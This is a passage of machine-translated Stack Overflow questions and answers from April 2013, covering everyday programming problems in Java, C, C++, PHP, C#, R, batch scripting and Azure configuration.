 <logger category="x.y.z">
            <level name="DEBUG"/>
        </logger> 
```

或者

```
 <logger category="x.y">
            <level name="DEBUG"/>
        </logger> 
```

或者

```
 <logger category="x">
            <level name="DEBUG"/>
        </logger> 
```

取决于您想要的粒度级别。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T11:00:21.577

Jboss 有它自己的绑定器，它不能被运行时覆盖，请确保您添加了具有适当调试级别的 log4j.properties。尝试在其中使用 fileappender 以便您了解 Jboss 是使用您的 log4j binder 还是它自己的。

# python - Enthought Canopy Windows 注册表项丢失

> ID：16013330
> 
> 赞同：2
> 
> 时间：2013-04-15T10:50:54.373
> 
> 标签：python, enthought

我安装了 Enthought Canopy 并尝试从[http://www.lfd.uci.edu/~gohlke/pythonlibs/](http://www.lfd.uci.edu/~gohlke/pythonlibs/)添加 vtk 包 但是，安装程序无法识别 python 安装。

我相信这与注册表项有关，因此与此问题类似的问题：[Python version 2.6 required, which was not found in the registry](https://stackoverflow.com/questions/3008509/python-version-2-6-required-which-was-not-found-in-the-registry)

按照建议将注册表项放置到：C:...\Local Settings\Application Data\Enthought\Canopy32\App\appdata\canopy-1.0.0.1160.win-x86 使安装程序可以看到 python 安装，但安装程序在下一步挂断。

这是 Canopy 中的一个问题，还是我应该采取另一条路线来安装其他可能无法通过 easy_install 获得的软件包。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-17T23:03:45.187

[断开链接，道歉：] 这是当前 Canopy 安装程序的限制。另一位用户在这里描述了一种手动解决方法： [https ://mail.enthought.com/pipermail/enthought-dev/2013-May/032416.html](https://mail.enthought.com/pipermail/enthought-dev/2013-May/032416.html)

* * *

更新：除了被破坏之外，以上内容没有实际意义：

1) VTK 现在是所有 Canopy 用户的免费包。

2) 对于其他尚不可用的包，如果 Canopy 是您的默认 Python，现在可以使用 pip 直接安装 Gohlke 的轮包。确保它是最简单的方法是使用“Canopy 命令提示符”（从“开始”菜单或“Canopy 工具”菜单打开）。

3) 关于如何将 3rd-party 包安装到 Canopy Python 中也是如此。

# c - C exec，awk，不工作

> ID：16013336
> 
> 赞同：0
> 
> 时间：2013-04-15T10:51:11.890
> 
> 标签：c, file, unix, awk, exec

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#define MAXLINE 512
main(int argc,char* argv[]){
    int k;
    for (k=0; k<=argc; k++) {
        if (k%2==0) {
            if (fork()==0){

    FILE *fi;
    FILE *fo;
    int i;
    fi=fopen(argv[k], "r");
    fo=fopen("temp.txt","w");
    if (!fi)
        return;
    char linie[MAXLINE],*p;
    for ( ; ; ) {
        p = fgets(linie, MAXLINE, fi);
        if (p == NULL)
            break;
        linie[MAXLINE-1] = '\0';
        int k=-1;
        for (i = 0; i <MAXLINE; i++) {
            if (linie[i]=='\n') k=i;
        }
        for (i = k; i >= 0; --i) {
            fprintf(fo,"%c", linie[i]);
        }
    }
    fclose(fi);
    fclose(fo);
                exit(1);}
        }
else
{
    if (fork()==0){
        execl("/usr/bin/awk","awk","-f","ouk.awk",argv[k],NULL);
        exit(1);
    }

}
    }

    }; 
```

这是 ouk.awk 文件内容

```
{ for (i=NF;i>=1;i--){ if(s){s=s" "$i} else{s=$i }}{print s;s=""}} 
```

基本上我尝试做的是创建一些 argc 进程，并且这个数字甚至是为了镜像文件中的文本，如果不从每一行向后重新排列单词，我面临的问题是

> fprintf(fo,"%c",line[j])

不工作，当我尝试执行 awk 脚本时也出现错误

> ```
> awk: can't open file >
>  input record number 6, file >
>  source line number 1 
> ```

如果我只在终端中使用相同的文件运行 awk 命令，它可以完美运行，因此它必须与 execl 命令有关。

还有一件事，我尝试了以下命令来重命名 temp.txt int argv[k]

```
execl("bin/mv","temp.txt",argv[k],NULL) 
```

但它崩溃了。

如果有人可以帮助我或给我一个好的 exec c 命令教程的链接，那就太好了，非常感谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T10:56:52.847

`for`循环超出了数组的范围（这是未定义的行为）：

```
for (k=0; k<=argc; k++) {
    /* ...snip... */
    fi=fopen(argv[k], "r"); 
```

由于数组具有从零开始的索引，从`0`到`N-1`where`N`是数组中元素的数量。的终止条件`for`必须是`k < argc`。此外，第一个元素`argv`是您要排除的程序的名称：

```
for (k = 1; k < argc; k++) 
```

调用时[`execl()`](http://linux.die.net/man/3/execl)，您需要将最后一个参数转换为 a `char*`：

```
execl("/usr/bin/awk","awk","-f","ouk.awk",argv[k], (char*)NULL); 
```

# c# - C# ASP.NET - 动态 Javascript 变量

> ID：16013337
> 
> 赞同：0
> 
> 时间：2013-04-15T10:51:25.017
> 
> 标签：c#, javascript, asp.net

我会尽量保持简单。

我正在使用简单的 html 按钮通过 Javascript 动态添加简单的 html 文本框，效果很好。

这是我当前的代码。

```
unction AddRow(tableId) {

        var table = document.getElementById(tableId);

        var rowCount = (table.rows.length);
        var row = table.insertRow(rowCount);
        row.setAttribute('name', 'row[]');

        var cell1 = row.insertCell(0);
        var element1 = document.createElement("input");
        element1.setAttribute('type', 'text');
        element1.setAttribute('name', 'dName[]');
        cell1.appendChild(element1);

        var cell2 = row.insertCell(1);
        var element2 = document.createElement("input");
        element2.setAttribute('type', 'text');
        element2.setAttribute('name', 'nNights[]');
        cell2.appendChild(element2);

        var cell3 = row.insertCell(2);
        var element3 = document.createElement("input");
        element3.setAttribute('type', 'button');
        element3.setAttribute('name', 'rmvButton[]');
        element3.setAttribute('value', 'Remove Destination');
        element3.onclick = function () {
            var temp = this;
            temp = temp.parentNode.parentNode;

            table.deleteRow(temp.rowIndex);

        }

        cell3.appendChild(element3); 
```

但是，当用户从 ASP 按钮单击提交时，我想将这些动态创建的文本字段中的文本添加到类中的变量以进行处理。

什么是最合适的方法来做到这一点，或者我没有使用 Javascript 动态创建这些变量？

谢谢

# symfony - 查询构建器多对多关系

> ID：16013346
> 
> 赞同：7
> 
> 时间：2013-04-15T10:51:48.320
> 
> 标签：symfony, doctrine, many-to-many, query-builder

我在多对多关系中遇到了查询生成器的一些问题。

我有一个实体公司，它也有子公司，所以我有：

```
class Company {

private $id;

/**
* @var ArrayCollection
* 
* @ORM\ManyToMany(targetEntity="Company")
* @ORM\JoinTable(name="company_relation", 
*   joinColumns={ 
*     @ORM\JoinColumn(name="id", referencedColumnName="id")
*   },
*   inverseJoinColumns={ 
*     @ORM\JoinColumn(name="subcompany", referencedColumnName="id")
*   }
* )
*/    
private $ChildrenCompany;

[...]

} 
```

然后我正在尝试创建一个查询构建器，它返回已确定子公司的公司（例如 id 为 5 的子公司）。我尝试了两种方式：

方法一）

```
$query->select ('c');
$query->from(MyBundle:Company, 'c');
$query->leftJoin('c.ChildrenCompany','j');
$query->where('j.subcompany = 5'); 
```

它不起作用并给我错误：Class Application\Sademer\CoreBundle\Entity\Company has no field or association named subcompany

方法 B)

```
$query->select ('c');
$query->from(MyBundle:Company, 'c');
$query->where('j.ChildrenCompany = 5'); 
```

它不起作用并给我错误：无效的 PathExpression。需要 StateFieldPathExpression 或 SingleValuedAssociationField。

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2015-07-10T11:09:20.880

还有另一种不使用 join 语句的方法，您只需添加以下代码即可提取 subcompanyId = 5 的公司

```
$query->where(':subCompanyId MEMBER OF c.ChildrenCompany');  
$query->setParameter("subCompanyId", 5); 
```

教义会为你做艰苦的工作。祝您编码愉快！

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2013-04-15T13:06:42.563

您应该能够检查 j.id：

```
$query->select ('c');
$query->from(MyBundle:Company, 'c');
$query->leftJoin('c.ChildrenCompany','j');
$query->where('j.id = :subCompanyId');  
$query->setParameter("subCompanyId", 5); 
```

如果您查看第一次遇到的错误，您会看到您有一个 Company 实例，这意味着您应该查询 Company 字段。当您连接别名时，您会针对目标实体而不是连接表编写查询。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-02-23T12:28:53.493

像这样做

```
Aisel\PageBundle\Entity\Page:
type: entity
table: aisel_page
repositoryClass: Aisel\PageBundle\Entity\PageRepository
id:
    id:
        type: integer
        id: true
        generator:
            strategy: AUTO
fields:
   ...

manyToMany:
  categories:
    targetEntity: Aisel\CategoryBundle\Entity\Category
    joinTable:
      name: aisel_page_category
      joinColumns:
        page_id:
          referencedColumnName: id
      inverseJoinColumns:
        category_id:
          referencedColumnName: id 
```

在你的功能中

```
public function getPagesByCategory($categoryId)
{
    $qb = $this->getEntityManager()->createQueryBuilder();

    $categoryId = 291; // CategoryId
    $r = $qb->select('p')
        ->from('AiselPageBundle:Page', 'p')
        ->innerJoin('p.categories','c')
        ->where('p.status = 1')
        ->andWhere('p.isHidden != 1')
        ->andWhere('c.id = :categoryId')->setParameter('categoryId',$categoryId)
        ->getQuery()
        ->execute();

    return $r;
} 
```

# java - 使用 BoxLayout 面板构建 Java GUI 时，如何在同一行添加两个 swing 组件？

> ID：16013347
> 
> 赞同：2
> 
> 时间：2013-04-15T10:51:51.103
> 
> 标签：java, swing, user-interface

我需要能够将两个组件放在一行上，用其他几个标签和文本字段重复几次，但要让所有东西都整齐地堆叠在一起。我将在下面发布我的代码。

```
package madLibs;

import java.awt.BorderLayout;
import java.awt.Color;

import javax.swing.BoxLayout;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JTextField;

public class MadLibsGUI {

    public static void main(String[] args) {
        MadLibsGUI main = new MadLibsGUI();
        main.start();
    }

    public void start() {
        JFrame frame = new JFrame();
        JPanel panel = new JPanel();
        JButton madLibButton = new JButton("Lib it!");

        JLabel title = new JLabel("Welcome to mad libs! \n Put in your words and press the 'Lib It' button to play!");
        JLabel nameLabel = new JLabel("Name: ");
        JLabel verbLabel1 = new JLabel("Verb: ");
        JLabel adjLabel = new JLabel("Adjective: ");
        JLabel verbLabel2 = new JLabel("Verb: ");
        JLabel nounLabel = new JLabel("Noun: ");

        JTextField nameTxt = new JTextField(20);
        JTextField verbTxt1 = new JTextField(20);
        JTextField adjTxt = new JTextField(20);
        JTextField verbTxt2 = new JTextField(20);
        JTextField nounTxt = new JTextField(20);

        frame.getContentPane().add(BorderLayout.SOUTH, madLibButton);
        frame.getContentPane().add(BorderLayout.NORTH, title);

        panel.setLayout(new BoxLayout(panel, BoxLayout.Y_AXIS));
        panel.setBackground(Color.green);
        frame.getContentPane().add(panel);

        panel.add(nameLabel, nameTxt);
        panel.add(verbLabel1);
        panel.add(verbTxt1);
        panel.add(adjLabel);
        panel.add(adjTxt);
        panel.add(verbLabel2);
        panel.add(verbTxt2);
        panel.add(nounLabel);
        panel.add(nounTxt);

        frame.setSize(500, 500);
        frame.setVisible(true);
    }
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-15T11:02:16.900

这是一种使用方法`GridBagLayout`：

还有很多其他方法可以解决这个问题。

```
import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.GridBagConstraints;
import java.awt.GridBagLayout;

import javax.swing.BorderFactory;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JTextField;
import javax.swing.SwingUtilities;

public class MadLibsGUI {

    public void start() {
        JFrame frame = new JFrame();
        JPanel panel = new JPanel();
        JButton madLibButton = new JButton("Lib it!");

        JLabel title = new JLabel("Welcome to mad libs! \n Put in your words and press the 'Lib It' button to play!");
        JLabel nameLabel = new JLabel("Name: ");
        JLabel verbLabel1 = new JLabel("Verb: ");
        JLabel adjLabel = new JLabel("Adjective: ");
        JLabel verbLabel2 = new JLabel("Verb: ");
        JLabel nounLabel = new JLabel("Noun: ");

        JTextField nameTxt = new JTextField(20);
        JTextField verbTxt1 = new JTextField(20);
        JTextField adjTxt = new JTextField(20);
        JTextField verbTxt2 = new JTextField(20);
        JTextField nounTxt = new JTextField(20);

        frame.getContentPane().add(BorderLayout.SOUTH, madLibButton);
        frame.getContentPane().add(BorderLayout.NORTH, title);

        panel.setLayout(new GridBagLayout());
        panel.setBackground(Color.green);
        frame.getContentPane().add(panel);
        GridBagConstraints left = new GridBagConstraints();
        left.anchor = GridBagConstraints.EAST;
        GridBagConstraints right = new GridBagConstraints();
        right.weightx = 2.0;
        right.fill = GridBagConstraints.HORIZONTAL;
        right.gridwidth = GridBagConstraints.REMAINDER;
        panel.add(nameLabel, left);
        panel.add(nameTxt, right);
        panel.add(verbLabel1, left);
        panel.add(verbTxt1, right);
        panel.add(adjLabel, left);
        panel.add(adjTxt, right);
        panel.add(verbLabel2, left);
        panel.add(verbTxt2, right);
        panel.add(nounLabel, left);
        panel.add(nounTxt, right);
        panel.setBorder(BorderFactory.createEmptyBorder(5, 5, 5, 5));
        frame.pack();
        frame.setVisible(true);
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                MadLibsGUI main = new MadLibsGUI();
                main.start();
            }
        });
    }

} 
```

结果：

![结果](https://i.stack.imgur.com/lTxbr.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-07-10T05:49:01.447

另一个使用 GridBagLayout 的简单示例。

要求是有两个并排的组件。使用 BorderLayout 每个组件在组件中只能有一个区域，即 NORTH、SOUTH、EAST 或 WEST 等。

这是通过使用 GridBagLayout 修复的

```
 JPanel panel1 = new JPanel(new GridBagLayout());

        JPanel content1 = new JPanel(new GridLayout(0, 1));
        Border border = BorderFactory.createTitledBorder("Workflow Files");
        content1.setBorder(border);
        ButtonGroup group = new ButtonGroup();
        JRadioButton aRadioButton = new JRadioButton("4 slices");
        content1.add(aRadioButton);
        group.add(aRadioButton);
        aRadioButton = new JRadioButton("8 slices", true);
        content1.add(aRadioButton);
        group.add(aRadioButton);
        aRadioButton = new JRadioButton("12 slices");
        content1.add(aRadioButton);
        group.add(aRadioButton);
        aRadioButton = new JRadioButton("16 slices");
        content1.add(aRadioButton);
        group.add(aRadioButton);

        GridBagConstraints c = new GridBagConstraints();
        c.fill = GridBagConstraints.HORIZONTAL;
        c.weightx = 0.5;
        c.gridx = 0;
        c.gridy = 0;
        panel1.add(content1, c);

        JPanel content2 = new JPanel(new GridLayout(0,1));
        border = BorderFactory.createTitledBorder("Topology Files");
        content2.setBorder(border);
        JCheckBox aCheckbox = new JCheckBox("Achivoes");
        content2.add(aCheckbox);
        aCheckbox = new JCheckBox("Grass");
        content2.add(aCheckbox);

        c.fill = GridBagConstraints.HORIZONTAL;
        c.weightx = 0.5;
        c.gridx = 1;
        c.gridy = 0;
        panel1.add(content2, c); 
```

![在此处输入图像描述](https://i.stack.imgur.com/6AAbr.png)

# c++ - 未定义的参考

> ID：16013350
> 
> 赞同：-3
> 
> 时间：2013-04-15T10:51:57.140
> 
> 标签：c++, pointers, c++builder

在下面的代码中

```
map<nsaddr_t, Rating*>::iterator it; 
```

为以下行生成错误

```
(it->second)->updateRating(alpha, beta, TRUST_FADING, 1); 
```

编译过程中出现“未定义引用”的错误。

语法是否正确或需要其他任何东西。

我没有在整个代码中找到 second 的声明。

```
void TrustManager::updateTrust(nsaddr_t address, double alpha, double beta)
{
    map<nsaddr_t, Rating*>::iterator it;
    it = trust_t.find(address);
    if (it == trust_t.end())
    {
        trust_t[address] = initNewRating(alpha, beta, 1);
    }
    else
    {
        (it->second)->updateRating(alpha, beta, TRUST_FADING, 1);
    }
}
bool TrustManager::isTrustworthy(nsaddr_t from)
{
    map<nsaddr_t, Rating*>::iterator it;
    it = trust_t.find(from);
    if (it != trust_t.end())
    {
        double alpha = (it->second)->getAlpha();
        double beta = (it->second)->getBeta();
        double dev = alpha/(alpha+beta);
        return (dev >= UNTRUST_TOLERANCE) ? false:true;
    }
    else
        return true;
} 
```

完整的错误是

```
In function `TrustManager::updateTrust(int, double, double)':
:(.text+0xde): undefined reference to `Rating::updateRating(double, double, double, double)'

In function `TrustManager::handleInactivityTimeout()':

(.text+0x241): undefined reference to `Rating::updateRating(double, double, double, double)'
In function `TrustManager::initNewRating(double, double, double)':

trustmanager.cc:(.text+0x306): undefined reference to `Rating::updateRating(double, double, double, double)'

In function `DSRAgent::DSRAgent()':

(.text+0x5b7): undefined reference to `makeRouteCache()'

In function `RouteCache::pre_noticeRouteUsed(Path const&, Path&, double, ID const&)':

(.text+0x54b): undefined reference to `cache_ignore_hints'

routecache.cc:(.text+0x620): undefined reference to `cache_use_overheard_routes'

dsr/routecache.o: In function `RouteCacheClass::create(int, char const* const*)':

(.text._ZN15RouteCacheClass6createEiPKPKc[RouteCacheClass::create(int, char const* 

const*)]+0x7): undefined reference to `makeRouteCache()'

collect2: ld returned 1 exit status 
```

评级定义如下：

```
class Rating
{
public:
    Rating() { alpha = 1.0; beta = 1.0;}
    Rating(double a, double b) { alpha = a; beta = b; last_t =
        Scheduler::instance().clock();}
    void updateRating(double a, double b, double fading, double weight);
    inline double getAlpha() { return alpha; }
    inline double getBeta() { return beta; }
    inline Time getTime() { return last_t; }
private:
    //the rating of misbehavior
    double alpha;
    //the rating of good behavior
    double beta;
    //last updated time
    Time last_t;
};
class PackData {
public:
    PackData();
    PackData(Packet* packet, Time t);
    Packet* packet;
    Time t;
}; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T11:00:04.120

错误信息非常准确：

```
In function `TrustManager::updateTrust(int, double, double)':
:(.text+0xde): undefined reference to `Rating::updateRating(double, double, double, double)' 
```

您正在`updateRating()`从inside 调用该函数`updateTrust()`，但您没有在任何地方定义该函数 - 至少不是链接器可以找到它的位置。

大量相同类型的后续错误提示未正确添加到编译器/链接器命令行的翻译单元。`updateRating()`, `makeRouteCache()`,`cache_ignore_hints`等等等等 - 所有这些都必须在某个地方定义。

> 评级定义如下：

那是 的*声明*，`updateRating()`而不是*定义*。请注意，该标头中没有函数体 ( `{ ... }`)。

（此外，最好*不要*在头文件中提供函数体（或其他定义），而是将它们保存在相应的 .cpp 文件中。一方面，它使头文件更易于阅读，即有点自记录.)

# vbscript - 写入vbs时批处理脚本无法制作右括号）

> ID：16013355
> 
> 赞同：0
> 
> 时间：2013-04-15T10:52:19.113
> 
> 标签：vbscript, batch-file

我正在尝试通过批处理文件创建一个 vbs。但是有一条线我包含了一个对象。批处理文件无法将右括号 ) 写入 vbs，这在运行 vbs 时导致错误。

批处理文件代码为：

```
echo Set oShell = CreateObject("WScript.Shell") >> zipIt.vbs 
```

输出：

```
 echo Set oShell = CreateObject("WScript.Shell"
) 1>>zipIt.vbs
The process cannot access the file because it is being used by another process. 
```

vbs zipIt.vbs

```
Set oShell = CreateObject("WScript.Shell" 
```

vbs 输出：Microsoft (R) Windows Script Host Version 5.8 版权所有 (C) Microsoft Corporation。版权所有。

C:\Users\arvind\Desktop\zip\zipIt.vbs(1, 42) Microsoft VBScript 编译错误：预期为 ')'

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T11:03:02.117

试试这个：

```
echo Set oShell = CreateObject("WScript.Shell"^) >> zipIt.vbs 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T11:44:22.057

就像 Endoro 说的：

试试这个：

```
echo Set oShell = CreateObject("WScript.Shell"^) >> zipIt.vbs 
```

您的错误消息表明，您的行是位于括号块中的行的一部分。
因此，您遇到了右括号的问题（也在 echo 语句中）。
您可以通过转义右括号来避免此问题。

形成您的评论，我建议尝试这样的事情。
它对整个块只使用一个重定向，它更快、更可靠。

```
(
  for %%a in (dummy) DO (
    echo Set oShell = CreateObject("WScript.Shell"^)
    echo oShell.someMethod
  )
) > zipIt.vbs 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-08-29T08:19:08.333

当您回显任何代码时，您应该始终帮助批处理解释器了解什么是文本以及什么是批处理代码。因此，请始终使用插入符号“^”转义括号、更少和更大的符号以及类似的可能批处理代码部分。因此，它们被解释为普通文本。

# cakephp-2.0 - 使用单个模型插入多条记录

> ID：16013357
> 
> 赞同：0
> 
> 时间：2013-04-15T10:52:27.440
> 
> 标签：cakephp-2.0

我想插入多条记录。这是我的 ci=ontroller 代码：

```
if(empty($this->data) == false)
            {
                for($i=0;$i<=count($this->data['Breakdown']);$i++)
                {
                    echo count($this->data['Breakdown']);
                    $this->Breakdown->create(); 
                    if($this->Breakdown->save($this->data)) 
                    {

                         $this->Session->setFlash('Quantity Breakdown has been added Successfully.', 'default', array('class' => 'oMsg1 oMsgError1'));
                         //$this->redirect('qty_breakdown');
                    } 
                }

            }
            else
             {
              $this->set('errors', $this->Breakdown->invalidFields());   
             } 
```

我的问题是，如果我在文本字段中只输入一个值，它会插入记录八次。我想要一个解决方案来使用此代码完美地插入它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T19:54:33.763

# 通过 Model::saveMany() 保存多条记录

您不必手动循环数据，CakePHP 模型能够自动处理所有这些，只要您根据 CakePHP 约定创建表单

## 通过 FormHelper 创建正确的表单输入

为使其正常工作，您发布的数据应符合 CakePHP 约定；

例如：像这样创建您的表单输入：

```
echo $this->Form->input('Breakdown.1.field1');
echo $this->Form->input('Breakdown.1.field2');

// ....

echo $this->Form->input('Breakdown.99.field1');
echo $this->Form->input('Breakdown.99.field2'); 
```

其中，在调试控制器内发布的数据时，应该如下所示：

```
debug($this->request->data);

array(
    'Breakdown' => array(
        (int) 1 => array(
            'field1' => 'value of field1 in row 1',
            'field2' => 'value of field2 in row 1'
        ),
        (int) 2 => array(
            'field1' => 'value of field1 in row 2',
            'field2' => 'value of field2 in row 2'
        )
    )
) 
```

## 保存数据 - 控制器代码

然后，在您的控制器内部：

```
public function qty_breakdown()
{
    $this->layout = 'common';

    if ($this->request->is('post') && !empty($this->data['Breakdown'])) {
        if ($this->Breakdown->saveMany($this->data['Breakdown'])) {
            $this->Session->setFlash(
                'Quantity Breakdown has been added Successfully.',
                'default',
                array('class' => 'oMsg1 oMsgError1')
            );
            $this->redirect('qty_breakdown');
        } else {
            // NOTE: If you're using the FormHelper, you DON'T
            // have to do this, the FormHelper will automatically
            // mark invalid fields 'invalid'
            $this->set('errors', $this->Breakdown->invalidFields());

            // However, it's Good practice to set a general error message
            $this->Session->setFlash('Unable to save your data');
        }
    }
} 
```

## 文档

这部分文档描述了[Model::saveMany()](http://book.cakephp.org/2.0/en/models/saving-your-data.html#model-savemany-array-data-null-array-options-array)

# wcf - WCF 库设置不在 Web.config 文件中

> ID：16013359
> 
> 赞同：0
> 
> 时间：2013-04-15T10:52:30.430
> 
> 标签：wcf

我这里有一个奇怪的情况。我有使用 Library 的 WCF 项目，实际上我有一个带有合同的 .svc 并且所有逻辑都在不同的 .DLL 中。一个解决方案 2 个项目

想法是在库中我使用 App.Config 文件（实际上是 Settings.settings 文件）但是当我编译 WCF 并使用 VS 发布时，我在 web.config 中找不到设置。该项目工作正常，但我不知道设置存储在哪里

有人知道吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T12:39:29.940

好吧，经过一番研究和尝试，看起来在这种情况下，Settings.settings只是嵌入在.DLL中，没有额外的.configuration文件。如果其他人有更多关于原因和方式的详细信息，欢迎在这里写，否则，我认为这些信息对于其他有同样问题的人来说已经足够了

# c# - 移动站点检测

> ID：16013360
> 
> 赞同：1
> 
> 时间：2013-04-15T10:52:31.153
> 
> 标签：c#, php, javascript, asp.net, mobile

接下来最好的方法是：

我有常规站点，可以说：www.regular.com（示例）和移动站点：mobile.regular.com

如果有人通过移动设备（iphone、android 等）进入常规站点，则进入提供 2 个选项的页面：

1) 进入常规站点

2) 进入手机网站

到目前为止，我接下来做了：

```
<a href="http://mobile.regular.com">To Mobile site</a>

<a id="fullsite" href="http://regular.com">To regular site</a>

    <script type="text/javascript">
    document.getElementById('fullsite').addEventListener('click',gotoFullSite,true);

    function gotoFullSite(e) {
    e.preventDefault();
    setCookie("viewFullSite", true, 1);
    location.href = this.getAttribute('http://regular.com');
    }
    </script> 
```

我需要在常规站点中添加什么，以自动识别用户是否来自移动设备？如果有人想显示常规网站，即使是通过移动设备，也可以这样做？

如果它很重要：

移动网站在 Wordpress 中

常规站点位于 ASP.NET c#

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T18:47:04.990

在 Javascript 中：

```
if(navigator.userAgent.match(/Android|webOS|iPhone|iPod|BlackBerry|iPad/i)){
alert("I am mobile browser");
}else {
alert("I am desktop browser");
} 
```

在 C# 中：

```
if (Request.Headers["User-Agent"] != null && (Request.Browser["IsMobileDevice"] ==  "true" || Request.Browser["BlackBerry"] == "true"||request.UserAgent.ToLower().Contains("iphone"))
{
Response.Redirect("http://Yourwebsite.com");
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T10:54:02.417

在 PHP 中，它们是可用于检测设备/通道的库。例如，Mobile Detect 就是这样一种库文件。试试看。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-15T10:54:53.573

使用`IsMobileDevice`标志。

尝试：

```
Request.Browser.IsMobileDevice 
```

重定向：

```
Response.Status="302 Moved Temporarily"
Response.AddHeader "Location","http://m.yoursite.com" 
```

希望它有帮助。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-15T11:23:25.847

```
function IsMobile() {
var navi = navigator.userAgent.toLowerCase();
if( navi.match(/android/i)
   || navi.match(/webos/i)
   || navi.match(/iphone/i)
   || navi.match(/ipad/i)
   || navi.match(/ipod/i)
   || navi.match(/blackberry/i)
   || navi.match(/windows phone/i)
 )
 {
    window.location.href = "http://mobile.regular.com";
 }    
}

$(document).ready(function(){
  IsMobile();
  //do code for regular site
}); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-15T10:59:32.983

您应该使用[WURFL](http://wurfl.sourceforge.net/apis.php)在服务器端执行此操作。它具有可用于本机 .NET 集成的版本，您可以在链接上看到。

所有其他方法（更多）不可靠和/或不标准化，例如 IsMobileDevice 标志（另外，笔记本电脑是否是移动设备？并且带有触摸屏？混合笔记本电脑/平板电脑？）

# r - 标准化不是列之间，而是列的一小部分，使用 R

> ID：16013361
> 
> 赞同：1
> 
> 时间：2013-04-15T10:52:31.620
> 
> 标签：r, statistics-bootstrap

我有一个多层次的结构，我需要做的是为每个人标准化（这是更高级别的单位，每个单位都有几个单独的措施）。

考虑：

```
 ID measure score
1  1       1     5
2  1       2     7
3  1       3     3
4  2       1    10
5  2       2     5
6  2       3     3
7  3       1     4
8  3       2     1
9  3       3     1 
```

我曾经`apply(data, 2, scale)`为每个人标准化（这也标准化了 ID 和度量，但没关系）。

但是，我如何确保分别对`ID == 1`,`ID == 2`和进行标准化`ID == 3`？--> 每个`observation`- `mean of 3 scores`，除以`standard deviation for 3 scores`)。

我正在考虑一个`for`循环，但问题是我想引导它（换句话说，为一个大数据集复制整个过程 1000 次，所以速度非常重要）。

额外信息：ID 可以有可变的测量值，所以并不是它们都有 3 个测量分数。

的`dput`数据是：

```
structure(list(ID = c(1L, 1L, 1L, 2L, 2L, 2L, 3L, 3L, 3L), measure = c(1L, 
2L, 3L, 1L, 2L, 3L, 1L, 2L, 3L), score = c(5L, 7L, 3L, 10L, 5L, 
3L, 4L, 1L, 1L)), .Names = c("ID", "measure", "score"), class = "data.frame", row.names = c(NA, 
-9L)) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-15T11:14:56.533

这是一个`lapply`解决`split`方案并假设您的数据是`DF`

```
> lapply(split(DF[,-1], DF[,1]), function(x) apply(x, 2, scale))
$`1`
     measure score
[1,]      -1     0
[2,]       0     1
[3,]       1    -1

$`2`
     measure      score
[1,]      -1  1.1094004
[2,]       0 -0.2773501
[3,]       1 -0.8320503

$`3`
     measure      score
[1,]      -1  1.1547005
[2,]       0 -0.5773503
[3,]       1 -0.5773503 
```

产生相同结果的另一种方法是：

```
> simplify2array(lapply(split(DF[,-1], DF[,1]), scale)) 
```

此替代方案避免使用`apply`内部`lapply`调用。

这里`split`将数据划分为由定义的组`ID`并返回一个列表，因此您可以使用`lapply`循环遍历列表的每个元素应用`scale`。

@Roland 建议使用`ddply`from plyr ：

```
> library(plyr)
> ddply(DF, .(ID), numcolwise(scale))
  ID measure      score
1  1      -1  0.0000000
2  1       0  1.0000000
3  1       1 -1.0000000
4  2      -1  1.1094004
5  2       0 -0.2773501
6  2       1 -0.8320503
7  3      -1  1.1547005
8  3       0 -0.5773503
9  3       1 -0.5773503 
```

导入您的数据（这是回答最后一条评论）

```
DF <- read.table(text="  ID measure score
1  1       1     5
2  1       2     7
3  1       3     3
4  2       1    10
5  2       2     5
6  2       3     3
7  3       1     4
8  3       2     1
9  3       3     1", header=TRUE) 
```

# azure - ImageResizer：用于云/开发的 web.config AzureReader 配置

> ID：16013363
> 
> 赞同：0
> 
> 时间：2013-04-15T10:52:45.493
> 
> 标签：azure, azure-blob-storage, imageresizer

我正在使用 ImageResizer ( [http://imageresizing.net/](http://imageresizing.net/) )，并且我在 web.config 文件中配置了 AzureReader，如下所示：

```
<resizer>
  <plugins>
    <add name="AzureReader" 
         connectionString="AzureStorageConnectionString"
         endpoint="<myendopointurl>"
         prefix="images"/>
  </plugins>
</resizer> 
```

一切正常，但是由于端点在开发部署和 Azure 部署之间发生了变化，我该如何管理呢？AzureStorageConnectionString 设置是自动管理的（放置在服务配置中），但如果我为 endpoing 属性考虑（放置服务配置字段的名称），它就不起作用。端点属性应该是：

```
http://127.0.0.1:10000/devstoreaccount1/... 
```

对于本地部署和

```
http://<account>.blob.core.windows.net/... 
```

用于 Azure 部署。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:56:49.500

使用 web.config 转换。没有什么比这更微不足道了。

[在这里](http://go.microsoft.com/fwlink/?LinkId=125889)阅读更多。

**更新**（评论1）

